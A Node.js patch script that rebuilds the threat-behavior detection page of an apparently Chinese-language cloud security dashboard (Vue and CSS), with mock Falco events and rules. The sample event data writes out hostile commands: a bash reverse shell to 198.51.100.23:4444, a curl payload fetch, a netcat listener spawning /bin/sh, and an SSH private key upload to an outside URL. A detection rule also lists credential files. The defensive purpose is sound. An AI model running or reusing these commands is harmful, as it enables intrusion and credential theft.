import fs from 'node:fs';

const appPath = '/home/ubuntu/cloud-traffic-security/client/src/App.vue';
const cssPath = '/home/ubuntu/cloud-traffic-security/client/src/index.css';
let app = fs.readFileSync(appPath, 'utf8');
let css = fs.readFileSync(cssPath, 'utf8');

function replaceBetween(source, startMarker, endMarker, replacement, label) {
  const start = source.indexOf(startMarker);
  if (start === -1) throw new Error(`未找到开始标记：${label}`);
  const end = source.indexOf(endMarker, start);
  if (end === -1) throw new Error(`未找到结束标记：${label}`);
  return source.slice(0, start) + replacement + source.slice(end);
}

app = app.replace("const activeBehaviorLayer = ref('全部');", "const activeBehaviorLayer = ref('全部');\nconst selectedBehaviorEventId = ref('FB-9001');\nconst behaviorDrawerOpen = ref(false);");

const eventsBlock = `const behaviorEvents = [
  {
    id: 'FB-9001', time: '2026-05-08 10:24:18', layer: '容器安全', vector: '容器内 shell 会话创建', asset: 'namespace/pay-prod · pod/pay-api-6d79', rule: 'Terminal shell in container', level: '高危' as Severity, evidence: 'proc.name=bash user=root container.image=registry.local/pay-api:v2.7 command=bash -i', action: '已隔离 Pod 并保留容器快照', status: '阻断中', confidence: 98, owner: '支付业务组', node: 'node-cn-bj-cce-03', namespace: 'pay-prod', pod: 'pay-api-6d79c8d9f4-k2x7q', containerId: 'cri-o://8f42d1c3b7e9', image: 'registry.local/pay-api:v2.7@sha256:9f31c4', runtime: 'containerd 1.7.18', user: 'root', pid: 18422, parentPid: 18290, parentProcess: 'nginx: worker process', childProcesses: ['bash -i', 'cat /etc/passwd', 'curl 198.51.100.23/p.sh'], commandLine: 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1', cwd: '/app', tty: 'pts/0', processTree: [{ name: 'containerd-shim', pid: 18110, depth: 0 }, { name: 'nginx: worker process', pid: 18290, depth: 1 }, { name: 'bash -i', pid: 18422, depth: 2 }, { name: 'curl 198.51.100.23/p.sh', pid: 18431, depth: 3 }], evidenceFields: ['evt.type=execve', 'container.id=8f42d1c3b7e9', 'proc.name=bash', 'user.name=root', 'fd.rip=198.51.100.23'], suggestion: '立即隔离 Pod，保留容器快照，核查镜像入口脚本与最近一次发布差异。'
  },
  {
    id: 'FB-9002', time: '2026-05-08 10:21:06', layer: '容器安全', vector: '容器内安装新软件包', asset: 'namespace/data-prod · pod/etl-worker-0', rule: 'Package management launched in container', level: '中危' as Severity, evidence: 'proc.name=apt-get evt.type=execve user=app path=/usr/bin/apt-get', action: '已触发镜像漂移复核', status: '待复核', confidence: 87, owner: '数据平台组', node: 'node-cn-sh-cce-07', namespace: 'data-prod', pod: 'etl-worker-0', containerId: 'containerd://31ad92f00ab1', image: 'registry.local/etl-worker:1.18.3@sha256:2aa78d', runtime: 'containerd 1.7.18', user: 'app', pid: 22791, parentPid: 22718, parentProcess: 'python /jobs/runner.py', childProcesses: ['apt-get update', 'dpkg --configure -a'], commandLine: 'apt-get update && apt-get install -y netcat-openbsd', cwd: '/jobs', tty: '-', processTree: [{ name: 'python /jobs/runner.py', pid: 22718, depth: 0 }, { name: 'sh -c apt-get update', pid: 22788, depth: 1 }, { name: 'apt-get update', pid: 22791, depth: 2 }, { name: 'dpkg --configure -a', pid: 22810, depth: 2 }], evidenceFields: ['proc.name=apt-get', 'evt.arg.path=/usr/bin/apt-get', 'container.image=etl-worker:1.18.3', 'user.name=app'], suggestion: '比对镜像 SBOM 与运行时包清单，确认是否存在调试工具或反向连接工具落地。'
  },
  {
    id: 'FB-9003', time: '2026-05-08 10:17:45', layer: '主机安全', vector: '敏感目录写入', asset: 'node-cn-bj-ecs-03', rule: 'Write below binary dir', level: '高危' as Severity, evidence: 'fd.name=/usr/bin/.cache/kswapd proc.name=sh user=root', action: '已收敛节点污点并发起 EDR 扫描', status: '处置中', confidence: 96, owner: '基础设施组', node: 'node-cn-bj-ecs-03', namespace: '-', pod: '-', containerId: '-', image: 'host-process', runtime: 'host', user: 'root', pid: 3981, parentPid: 3978, parentProcess: 'sshd: root@pts/2', childProcesses: ['cp /tmp/kswapd /usr/bin/.cache/kswapd', 'chmod 755 /usr/bin/.cache/kswapd'], commandLine: 'sh -c cp /tmp/kswapd /usr/bin/.cache/kswapd && chmod 755 /usr/bin/.cache/kswapd', cwd: '/tmp', tty: 'pts/2', processTree: [{ name: 'sshd: root@pts/2', pid: 3978, depth: 0 }, { name: 'sh -c cp /tmp/kswapd ...', pid: 3981, depth: 1 }, { name: 'cp /tmp/kswapd /usr/bin/.cache/kswapd', pid: 3984, depth: 2 }, { name: 'chmod 755 /usr/bin/.cache/kswapd', pid: 3987, depth: 2 }], evidenceFields: ['fd.directory=/usr/bin', 'evt.type=open_write', 'user.uid=0', 'proc.pname=sshd'], suggestion: '对节点执行隔离与文件哈希提取，核查登录来源、sudo 审计和持久化项。'
  },
  {
    id: 'FB-9004', time: '2026-05-08 10:13:52', layer: '网络威胁', vector: '意外端口监听', asset: 'namespace/ops · pod/debug-toolbox', rule: 'Unexpected listening port', level: '中危' as Severity, evidence: 'fd.sport=4444 proc.name=nc container.id=8f42d1', action: '已阻断安全组入站并通知负责人', status: '已阻断', confidence: 91, owner: '运维工具组', node: 'node-cn-gz-cce-02', namespace: 'ops', pod: 'debug-toolbox-6f9d44', containerId: 'containerd://8f42d1ad003e', image: 'registry.local/debug-toolbox:2026.05@sha256:bb8021', runtime: 'containerd 1.7.18', user: 'ops', pid: 11203, parentPid: 11191, parentProcess: 'sh', childProcesses: ['nc -lvnp 4444'], commandLine: 'nc -lvnp 4444 -e /bin/sh', cwd: '/workspace', tty: 'pts/1', processTree: [{ name: 'kubectl exec session', pid: 11182, depth: 0 }, { name: 'sh', pid: 11191, depth: 1 }, { name: 'nc -lvnp 4444', pid: 11203, depth: 2 }], evidenceFields: ['evt.type=listen', 'fd.sport=4444', 'proc.name=nc', 'container.name=debug-toolbox'], suggestion: '收敛调试容器权限，关闭临时监听端口，并检查是否存在外部连接回连。'
  },
  {
    id: 'FB-9005', time: '2026-05-08 10:09:39', layer: '敏感数据保护', vector: 'SSH 私钥读取', asset: 'node-cn-tj-host-11', rule: 'Read sensitive credential file', level: '高危' as Severity, evidence: 'fd.name=/root/.ssh/id_rsa proc.name=python3 user=root', action: '已冻结访问令牌并生成凭证轮换工单', status: '已生成工单', confidence: 94, owner: '平台安全组', node: 'node-cn-tj-host-11', namespace: '-', pod: '-', containerId: '-', image: 'host-process', runtime: 'host', user: 'root', pid: 6209, parentPid: 6202, parentProcess: 'python3 /opt/scripts/collect.py', childProcesses: ['open /root/.ssh/id_rsa', 'POST https://api.example.net/upload'], commandLine: 'python3 /opt/scripts/collect.py --path /root/.ssh/id_rsa --target https://api.example.net/upload', cwd: '/opt/scripts', tty: '-', processTree: [{ name: 'crond', pid: 996, depth: 0 }, { name: 'python3 /opt/scripts/collect.py', pid: 6202, depth: 1 }, { name: 'open /root/.ssh/id_rsa', pid: 6209, depth: 2 }, { name: 'https upload worker', pid: 6216, depth: 2 }], evidenceFields: ['fd.name=/root/.ssh/id_rsa', 'evt.type=open_read', 'proc.name=python3', 'fd.rip=203.0.113.45'], suggestion: '立即轮换 SSH 密钥与相关 API 凭证，排查脚本来源并补充敏感文件访问白名单。'
  },
];

`;
app = replaceBetween(app, 'const behaviorEvents = [', 'const behaviorRules = [', eventsBlock, 'behaviorEvents');

const rulesBlock = `const behaviorRules = [
  { rule: 'Terminal shell in container', layer: '容器安全', severity: '高危' as Severity, condition: 'container.id exists and proc.name in (bash, sh, zsh)', scope: '生产命名空间', status: '阻断+告警', hits: 142, coverage: '生产 Pod 98%' },
  { rule: 'Write below etc or binary dir', layer: '主机安全', severity: '高危' as Severity, condition: 'fd.directory in (/etc, /usr/bin, /usr/sbin) and evt.type in (open_write, chmod, chown)', scope: '全部宿主机', status: '告警+快照', hits: 96, coverage: '宿主机 100%' },
  { rule: 'Unexpected outbound connection', layer: '网络威胁', severity: '中危' as Severity, condition: 'not fd.sip in approved_cidrs and fd.type=ipv4', scope: '出口网关与 Pod', status: '告警+联动防火墙', hits: 121, coverage: '出口链路 93%' },
  { rule: 'Read sensitive credential file', layer: '敏感数据保护', severity: '高危' as Severity, condition: 'fd.name in (/etc/shadow, /etc/passwd, ~/.ssh/*, /var/run/secrets/*)', scope: '节点与容器', status: '阻断+凭证轮换', hits: 67, coverage: '敏感路径 100%' },
];

`;
app = replaceBetween(app, 'const behaviorRules = [', 'const alerts = ref([', rulesBlock, 'behaviorRules');

app = app.replace('const filteredBehaviorEvents = computed(() => behaviorEvents.filter((item) => activeBehaviorLayer.value === \'全部\' || item.layer === activeBehaviorLayer.value));', "const filteredBehaviorEvents = computed(() => behaviorEvents.filter((item) => activeBehaviorLayer.value === '全部' || item.layer === activeBehaviorLayer.value));\nconst selectedBehaviorEvent = computed(() => behaviorEvents.find((item) => item.id === selectedBehaviorEventId.value) || behaviorEvents[0]);");

const functionInsert = `
function openBehaviorEvent(id: string) {
  selectedBehaviorEventId.value = id;
  behaviorDrawerOpen.value = true;
  showToast(\`已打开威胁行为检测事件 \${id} 的运行时证据\`);
}

function behaviorLayerClass(layer: string) {
  if (layer === '容器安全') return 'layer container';
  if (layer === '主机安全') return 'layer host';
  if (layer === '网络威胁') return 'layer network';
  return 'layer data';
}
`;
app = app.replace('\nfunction goTrace(id: string) {', `${functionInsert}\nfunction goTrace(id: string) {`);

const newSection = `<section v-if="activePage === 'behavior'" class="page-stack threat-behavior-page formal-behavior-page">
        <div class="soc-header-card">
          <div class="soc-header-main"><span class="soc-kicker"><AppIcon name="behavior" size="16" /> Falco Runtime Detection</span><h2>威胁行为检测</h2><p>基于容器运行时、宿主机系统调用、网络连接与敏感文件访问证据，识别云原生环境中的异常进程、横向移动、违规外联和凭证访问风险。</p></div>
          <div class="soc-header-actions"><button class="white-button" @click="showToast('已刷新威胁行为检测事件与规则命中统计')"><AppIcon name="refresh" size="15" /> 刷新事件</button><button class="blue-button" @click="showToast('已下发 Falco 规则同步任务')"><AppIcon name="rules" size="15" /> 同步规则</button><button class="white-button" @click="showToast('已导出威胁行为检测证据包')"><AppIcon name="download" size="15" /> 导出证据</button></div>
        </div>

        <div class="behavior-kpi-grid formal-kpis">
          <article v-for="stat in behaviorStats" :key="stat.label" :data-tone="stat.tone"><span><AppIcon :name="stat.icon" :label="stat.label" /></span><div><p>{{ stat.label }}</p><strong>{{ stat.value }}</strong><em>{{ stat.delta }}</em></div></article>
        </div>

        <div class="behavior-workbench">
          <aside class="behavior-rule-sidebar panel">
            <div class="panel-title-row"><h3>检测层面</h3><span>{{ filteredBehaviorEvents.length }} 条事件</span></div>
            <button v-for="layer in ['全部', '容器安全', '主机安全', '网络威胁', '敏感数据保护']" :key="layer" class="layer-filter" :class="{ active: activeBehaviorLayer === layer }" @click="activeBehaviorLayer = layer"><span :class="behaviorLayerClass(layer)"><AppIcon :name="iconFor(layer)" size="17" /></span><b>{{ layer }}</b><em>{{ layer === '全部' ? behaviorEvents.length : behaviorEvents.filter((item) => item.layer === layer).length }}</em></button>
            <div class="coverage-box"><h4>规则覆盖状态</h4><p>当前生产命名空间、宿主机节点、出口网关和敏感路径均已纳入检测策略，支持告警、阻断、快照与工单联动。</p></div>
          </aside>

          <section class="behavior-main-column">
            <div class="behavior-filter-card panel">
              <div class="filter-title"><strong>事件检索</strong><span>按运行时证据、资产对象、规则命中和处置状态串联审计闭环</span></div>
              <div class="filter-controls"><select><option>全部等级</option><option>高危</option><option>中危</option><option>低危</option></select><select><option>全部状态</option><option>阻断中</option><option>处置中</option><option>待复核</option></select><input placeholder="搜索事件ID、Pod、节点、进程、命令行或镜像"/><button class="blue-button" @click="showToast('已按威胁行为检测条件刷新事件列表')">查询</button><button class="white-button" @click="activeBehaviorLayer = '全部'">重置</button></div>
            </div>

            <div class="table-card behavior-event-card"><div class="table-title-row"><div><h3>威胁行为事件</h3><p>点击“详情”查看进程树、父子进程、命令行参数与容器镜像上下文。</p></div><span class="tag info">Falco 运行时证据</span></div><table class="data-table behavior-table formal-table"><thead><tr><th>事件ID</th><th>发生时间</th><th>检测层面</th><th>攻击向量</th><th>资产对象</th><th>进程 / 用户</th><th>规则</th><th>等级</th><th>状态</th><th>操作</th></tr></thead><tbody><tr v-for="event in filteredBehaviorEvents" :key="event.id" :class="{ selected: selectedBehaviorEventId === event.id }"><td><strong>{{ event.id }}</strong><small>{{ event.confidence }}% 置信</small></td><td>{{ event.time }}</td><td><span :class="behaviorLayerClass(event.layer)">{{ event.layer }}</span></td><td>{{ event.vector }}</td><td><b>{{ event.asset }}</b><small>{{ event.node }}</small></td><td><span class="process-cell">{{ event.parentProcess }} → {{ event.pid }}</span><small>{{ event.user }}</small></td><td>{{ event.rule }}</td><td><span :class="levelClass(event.level)">{{ event.level }}</span></td><td><span class="tag warning">{{ event.status }}</span></td><td class="ops"><button @click="openBehaviorEvent(event.id)">详情</button><button @click="showToast('事件 ' + event.id + ' 已加入处置队列')">处置</button></td></tr></tbody></table></div>
          </section>
        </div>

        <div class="behavior-rule-board panel"><div class="panel-title-row"><h3>Falco 检测规则覆盖</h3><button class="white-button" @click="showToast('已进入 Falco 规则灰度发布流程')">规则灰度发布</button></div><div class="rule-matrix"><article v-for="rule in behaviorRules" :key="rule.rule" class="rule-matrix-card"><div><span :class="behaviorLayerClass(rule.layer)">{{ rule.layer }}</span><strong>{{ rule.rule }}</strong><em>{{ rule.coverage }}</em></div><p>{{ rule.condition }}</p><footer><span :class="levelClass(rule.severity)">{{ rule.severity }}</span><span>{{ rule.scope }}</span><span>{{ rule.status }}</span><b>{{ rule.hits }} 次</b></footer></article></div></div>
      </section>

      `;
app = replaceBetween(app, '<section v-if="activePage === \'behavior\'" class="page-stack threat-behavior-page">', '<section v-if="activePage === \'intelligence\'"', newSection, 'behavior page template');

const drawer = `
    <aside v-if="behaviorDrawerOpen" class="drawer behavior-detail-drawer"><button class="drawer-close" @click="behaviorDrawerOpen = false">×</button><div class="drawer-heading"><span :class="behaviorLayerClass(selectedBehaviorEvent.layer)"><AppIcon :name="iconFor(selectedBehaviorEvent.layer)" size="18" /> {{ selectedBehaviorEvent.layer }}</span><h3>威胁行为检测事件：{{ selectedBehaviorEvent.id }}</h3><p>{{ selectedBehaviorEvent.vector }} · {{ selectedBehaviorEvent.time }} · 置信度 {{ selectedBehaviorEvent.confidence }}%</p></div><div class="detail-grid compact"><dl><dt>资产对象</dt><dd>{{ selectedBehaviorEvent.asset }}</dd><dt>命名空间 / Pod</dt><dd>{{ selectedBehaviorEvent.namespace }} / {{ selectedBehaviorEvent.pod }}</dd><dt>节点</dt><dd>{{ selectedBehaviorEvent.node }}</dd><dt>负责人</dt><dd>{{ selectedBehaviorEvent.owner }}</dd></dl><dl><dt>容器镜像</dt><dd class="mono-break">{{ selectedBehaviorEvent.image }}</dd><dt>容器 ID</dt><dd class="mono-break">{{ selectedBehaviorEvent.containerId }}</dd><dt>运行时</dt><dd>{{ selectedBehaviorEvent.runtime }}</dd><dt>当前状态</dt><dd><span class="tag warning">{{ selectedBehaviorEvent.status }}</span></dd></dl></div><section class="drawer-section"><h4>进程树</h4><div class="process-tree"><div v-for="node in selectedBehaviorEvent.processTree" :key="node.pid + '-' + node.name" class="process-node" :style="{ '--depth': node.depth }"><span>{{ node.pid }}</span><b>{{ node.name }}</b></div></div></section><section class="drawer-section"><h4>父子进程关系</h4><div class="process-relation"><article><span>父进程</span><strong>{{ selectedBehaviorEvent.parentProcess }}</strong><em>PPID {{ selectedBehaviorEvent.parentPid }}</em></article><article><span>当前进程</span><strong>{{ selectedBehaviorEvent.commandLine }}</strong><em>PID {{ selectedBehaviorEvent.pid }} · {{ selectedBehaviorEvent.user }}</em></article><article><span>子进程</span><strong>{{ selectedBehaviorEvent.childProcesses.join('；') }}</strong><em>工作目录 {{ selectedBehaviorEvent.cwd }} · TTY {{ selectedBehaviorEvent.tty }}</em></article></div></section><section class="drawer-section"><h4>命令行参数</h4><pre class="command-block">{{ selectedBehaviorEvent.commandLine }}</pre></section><section class="drawer-section"><h4>Falco 证据字段</h4><div class="evidence-chip-list"><span v-for="field in selectedBehaviorEvent.evidenceFields" :key="field">{{ field }}</span></div></section><div class="suggestion-box">{{ selectedBehaviorEvent.suggestion }}</div><div class="drawer-actions"><button class="blue-button" @click="showToast('已创建 ' + selectedBehaviorEvent.id + ' 处置工单')">创建处置工单</button><button class="white-button" @click="activeTraceTab = '资产关联关系'; setPage('trace'); behaviorDrawerOpen = false">关联溯源分析</button><button class="red-button" @click="showToast(selectedBehaviorEvent.asset + ' 已加入临时隔离策略')">隔离资产</button></div></aside>
`;
app = app.replace('<aside v-if="alertDrawerOpen" class="drawer">', `${drawer}\n    <aside v-if="alertDrawerOpen" class="drawer">`);

const cssBlock = `

/* 威胁行为检测模块正规化重构：正式安全运营系统布局、运行时证据表格与事件详情抽屉。 */
.formal-behavior-page {
  --soc-blue: #1d4ed8;
  --soc-ink: #172033;
}

.soc-header-card {
  display: flex;
  justify-content: space-between;
  gap: 24px;
  padding: 24px 26px;
  border: 1px solid #dbe5f3;
  border-radius: 18px;
  background: linear-gradient(135deg, #f8fbff 0%, #eef5ff 58%, #ffffff 100%);
  box-shadow: 0 16px 36px rgba(30, 64, 175, 0.08);
}

.soc-kicker,
.drawer-heading > span {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  color: #1d4ed8;
  font-size: 12px;
  font-weight: 800;
  letter-spacing: .08em;
  text-transform: uppercase;
}

.soc-header-main h2 {
  margin: 9px 0 8px;
  color: #111827;
  font-size: 28px;
}

.soc-header-main p {
  max-width: 820px;
  margin: 0;
  color: #5b6472;
  line-height: 1.75;
}

.soc-header-actions {
  display: flex;
  align-items: flex-start;
  gap: 10px;
  flex-wrap: wrap;
  justify-content: flex-end;
}

.soc-header-actions button,
.filter-controls button,
.behavior-rule-board button {
  display: inline-flex;
  align-items: center;
  gap: 7px;
}

.formal-kpis article {
  min-height: 118px;
  align-items: center;
}

.behavior-workbench {
  display: grid;
  grid-template-columns: 270px minmax(0, 1fr);
  gap: 18px;
}

.behavior-rule-sidebar {
  padding: 18px;
  align-self: start;
}

.panel-title-row,
.table-title-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 16px;
  margin-bottom: 14px;
}

.panel-title-row h3,
.table-title-row h3 {
  margin: 0;
  color: #172033;
}

.panel-title-row span,
.table-title-row p,
.filter-title span {
  color: #64748b;
  font-size: 13px;
}

.layer-filter {
  width: 100%;
  display: grid;
  grid-template-columns: 32px 1fr auto;
  align-items: center;
  gap: 10px;
  margin: 8px 0;
  padding: 10px;
  border: 1px solid #e4eaf3;
  border-radius: 12px;
  background: #fff;
  color: #253045;
  cursor: pointer;
  text-align: left;
  transition: all .18s ease;
}

.layer-filter:hover,
.layer-filter.active {
  border-color: #93c5fd;
  background: #eff6ff;
  box-shadow: 0 10px 24px rgba(37, 99, 235, .10);
}

.layer-filter em {
  color: #1d4ed8;
  font-style: normal;
  font-weight: 800;
}

.layer {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
  min-height: 26px;
  padding: 3px 8px;
  border-radius: 999px;
  font-size: 12px;
  font-weight: 800;
}

.layer.container { background: #eff6ff; color: #1d4ed8; }
.layer.host { background: #fff7ed; color: #c2410c; }
.layer.network { background: #ecfdf5; color: #047857; }
.layer.data { background: #fef2f2; color: #b91c1c; }

.coverage-box {
  margin-top: 16px;
  padding: 14px;
  border-radius: 14px;
  background: #f8fafc;
  border: 1px dashed #cbd5e1;
}

.coverage-box h4,
.drawer-section h4 {
  margin: 0 0 8px;
  color: #172033;
}

.coverage-box p {
  margin: 0;
  color: #64748b;
  line-height: 1.65;
  font-size: 13px;
}

.behavior-main-column {
  min-width: 0;
  display: grid;
  gap: 16px;
}

.behavior-filter-card {
  padding: 16px;
}

.filter-title {
  display: flex;
  justify-content: space-between;
  gap: 16px;
  margin-bottom: 12px;
}

.filter-controls {
  display: grid;
  grid-template-columns: 150px 150px minmax(220px, 1fr) auto auto;
  gap: 10px;
}

.filter-controls input,
.filter-controls select {
  height: 38px;
  border: 1px solid #d8e1ee;
  border-radius: 10px;
  padding: 0 11px;
  background: #fff;
}

.behavior-event-card {
  overflow: hidden;
}

.behavior-event-card .table-title-row {
  padding: 18px 18px 0;
}

.formal-table td small {
  display: block;
  margin-top: 3px;
  color: #778397;
  font-size: 12px;
}

.formal-table tr.selected {
  background: #f0f7ff;
}

.process-cell {
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 12px;
  color: #334155;
}

.behavior-rule-board {
  padding: 18px;
}

.rule-matrix {
  display: grid;
  grid-template-columns: repeat(4, minmax(0, 1fr));
  gap: 12px;
}

.rule-matrix-card {
  padding: 14px;
  border: 1px solid #e3eaf5;
  border-radius: 14px;
  background: #fff;
}

.rule-matrix-card strong,
.rule-matrix-card em {
  display: block;
  margin-top: 8px;
}

.rule-matrix-card em {
  color: #64748b;
  font-style: normal;
  font-size: 12px;
}

.rule-matrix-card p {
  min-height: 58px;
  color: #475569;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 12px;
  line-height: 1.55;
}

.rule-matrix-card footer {
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  color: #64748b;
  font-size: 12px;
}

.behavior-detail-drawer {
  width: min(760px, calc(100vw - 28px));
  overflow-y: auto;
}

.drawer-heading h3 {
  margin: 10px 0 4px;
}

.drawer-heading p {
  margin: 0 0 14px;
  color: #64748b;
}

.detail-grid.compact {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 12px;
}

.detail-grid.compact dl {
  margin: 0;
  padding: 14px;
  border: 1px solid #e2e8f0;
  border-radius: 14px;
  background: #f8fafc;
}

.mono-break,
.command-block,
.evidence-chip-list span {
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  word-break: break-all;
}

.drawer-section {
  margin-top: 16px;
  padding-top: 14px;
  border-top: 1px solid #e5eaf2;
}

.process-tree {
  display: grid;
  gap: 8px;
}

.process-node {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-left: calc(var(--depth) * 28px);
  padding: 9px 11px;
  border-radius: 10px;
  background: #f8fbff;
  border: 1px solid #dbeafe;
}

.process-node span {
  color: #1d4ed8;
  font-weight: 800;
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
}

.process-relation {
  display: grid;
  gap: 10px;
}

.process-relation article {
  padding: 12px;
  border-radius: 12px;
  border: 1px solid #e2e8f0;
  background: #fff;
}

.process-relation span,
.process-relation em {
  display: block;
  color: #64748b;
  font-style: normal;
  font-size: 12px;
}

.process-relation strong {
  display: block;
  margin: 5px 0;
  color: #172033;
}

.command-block {
  white-space: pre-wrap;
  margin: 0;
  padding: 13px;
  border-radius: 12px;
  color: #dbeafe;
  background: #0f172a;
  line-height: 1.65;
}

.evidence-chip-list {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;
}

.evidence-chip-list span {
  padding: 6px 9px;
  border-radius: 999px;
  background: #eef2ff;
  color: #3730a3;
  font-size: 12px;
}

@media (max-width: 1180px) {
  .behavior-workbench,
  .detail-grid.compact {
    grid-template-columns: 1fr;
  }
  .rule-matrix {
    grid-template-columns: repeat(2, minmax(0, 1fr));
  }
  .filter-controls {
    grid-template-columns: 1fr 1fr;
  }
}

@media (max-width: 760px) {
  .soc-header-card,
  .filter-title {
    flex-direction: column;
  }
  .rule-matrix,
  .filter-controls {
    grid-template-columns: 1fr;
  }
}
`;
css += cssBlock;

fs.writeFileSync(appPath, app);
fs.writeFileSync(cssPath, css);
console.log('威胁行为检测模块已正规化重构，并新增事件详情抽屉。');
